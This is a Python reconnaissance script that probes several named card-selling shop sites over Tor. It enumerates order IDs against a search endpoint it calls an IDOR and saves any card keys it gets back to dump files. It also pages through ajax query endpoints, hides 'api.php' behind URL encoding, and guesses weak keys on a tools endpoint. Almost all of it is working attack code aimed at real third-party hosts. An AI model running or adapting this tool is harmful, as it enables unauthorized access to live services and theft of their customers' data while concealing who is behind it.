#!/usr/bin/env python3
"""Deep-check o898 ajax200 + qingtianqq1 open api search + xinhe001 qd93."""
import json
import re
import subprocess
import time
from pathlib import Path

import requests

OUT = Path("/data/recon/batch19")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
PROXIES = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}


def log(*a):
    print(*a, flush=True)


def sess(base):
    host = base.split("/")[2]
    s = requests.Session()
    s.proxies.update(PROXIES)
    s.verify = False
    requests.packages.urllib3.disable_warnings()
    s.headers.update(
        {
            "User-Agent": UA,
            "Origin": f"https://{host}",
            "Referer": base + "/",
            "Accept-Language": "zh-CN,zh;q=0.9",
        }
    )
    return s


def curl61(base, qs):
    host = base.split("/")[2]
    cmd = [
        "curl", "-sS", "-m", "20", "-L",
        "-x", "socks5h://127.0.0.1:9050",
        "-A", UA,
        "-H", f"Origin: https://{host}",
        "-H", f"Referer: {base}/",
        f"{base}/%61pi.php?{qs}",
    ]
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=28)
    return p.stdout or p.stderr or ""


def main():
    out = {"kami_found": False, "dumps": {}}

    # --- o898 ajax query ---
    base = "https://o898.com/shop"
    s = sess(base)
    s.get(base + "/", timeout=40)
    for page in range(1, 6):
        r = s.get(
            base + f"/ajax.php?act=query&page={page}&limit=50",
            headers={"X-Requested-With": "XMLHttpRequest"},
            timeout=25,
        )
        log("o898 ajax", page, r.status_code, r.text[:220])
        try:
            j = r.json()
            data = j.get("data") if isinstance(j, dict) else None
            n = len(data) if isinstance(data, list) else None
            if n:
                out["kami_found"] = True
                (OUT / "dump" / f"o898_query_p{page}.json").write_text(r.text, encoding="utf-8")
            if isinstance(j, dict) and not j.get("isnext"):
                break
        except Exception:
            break
    for data in ["1", "test", "2169"]:
        r = s.get(base + f"/?mod=query&data={data}", timeout=30)
        hits = re.findall(r"showOrder|mod=faka|没有查询到|卡密", r.text)
        log("o898 qd93", data, hits[:6], len(r.text))

    # --- qingtianqq1 api search IDOR ---
    base = "https://qingtianqq1.top/shop"
    log("==== qingtianqq1 api search ====")
    # confirm shapes
    for i in [1, 2, 10, 100, 302, 500, 1000]:
        body = curl61(base, f"act=search&id={i}")
        log("qt shape", i, body[:220].replace("\n", " "))
        time.sleep(0.2)

    cards = []
    max_id = 400  # orders~302
    for i in range(1, max_id + 1):
        body = curl61(base, f"act=search&id={i}")
        try:
            j = json.loads(body)
        except Exception:
            j = None
        if not isinstance(j, dict):
            if i <= 5:
                log("qt bad", i, body[:120])
            continue
        msg = j.get("message") or j.get("msg") or ""
        data = j.get("data")
        # open IDOR often: code 0 with data, or code -1 订单不存在 vs real data
        if data not in (None, "", [], {}):
            cards.append({"id": i, "data": data, "raw": j})
            log("QT CARD", i, json.dumps(data, ensure_ascii=False)[:250])
            out["kami_found"] = True
        elif j.get("code") == 0 and "不存在" not in str(msg):
            # unexpected success
            cards.append({"id": i, "raw": j})
            log("QT ODD", i, body[:200])
        if i % 50 == 0:
            log("qt progress", i, "cards", len(cards))
        time.sleep(0.08)
    out["dumps"]["qingtianqq1_cards"] = len(cards)
    (OUT / "dump" / "qingtianqq1_cards.json").write_text(
        json.dumps(cards, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    log("QT TOTAL", len(cards))

    # also try api.php without obfuscation
    for i in [1, 50, 100, 200, 302]:
        body = curl61(base.replace("%61", "a") if False else base, f"act=search&id={i}")
        # direct api.php
        host = "qingtianqq1.top"
        cmd = [
            "curl", "-sS", "-m", "15", "-L", "-x", "socks5h://127.0.0.1:9050",
            "-A", UA, "-H", f"Origin: https://{host}", "-H", f"Referer: {base}/",
            f"{base}/api.php?act=search&id={i}",
        ]
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
        log("qt api.php", i, (p.stdout or "")[:180])

    # tools on qingtian
    for key in ["", "123456", "admin", "qingtian", "jgqb"]:
        body = curl61(base, f"act=tools&key={key}&limit=1")
        log("qt tools", repr(key), body[:160])

    # --- xinhe001 qd93 deeper (historical note) ---
    base = "https://xinhe001.lol/shop"
    s = sess(base)
    s.get(base + "/", timeout=40)
    r = s.get(base + "/ajax.php?act=getcount", headers={"X-Requested-With": "XMLHttpRequest"}, timeout=25)
    log("xinhe getcount", r.text[:200])
    for data in ["1", "xinghe", "xinghe0010", "@xinghe0010", "5886", "2024", "2025"]:
        rr = s.get(base + f"/?mod=query&data={data}", timeout=30)
        hits = re.findall(r"showOrder|mod=faka|没有查询到|卡密[^<]{0,40}", rr.text)
        log("xinhe qd93", data, hits[:8], "len", len(rr.text))
    r = s.get(
        base + "/ajax.php?act=query&page=1",
        headers={"X-Requested-With": "XMLHttpRequest"},
        timeout=25,
    )
    log("xinhe ajax", r.status_code, r.text[:200])

    # spot-check a few more for 订单不存在 unicode
    for base in [
        "https://kln166.lol/shop",
        "https://tianyu9080.top/shop",
        "https://kpba.shop/shop",
        "https://xinhe001.lol/shop",
    ]:
        body = curl61(base, "act=search&id=1")
        # decode unicode escapes if present
        try:
            j = json.loads(body)
            msg = j.get("message") or j.get("msg")
        except Exception:
            msg = body[:80]
        log("search_msg", base, msg)

    (OUT / "dump" / "DEEP.json").write_text(
        json.dumps(out, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    log("KAMI", out["kami_found"])
    log("DONE")


if __name__ == "__main__":
    main()
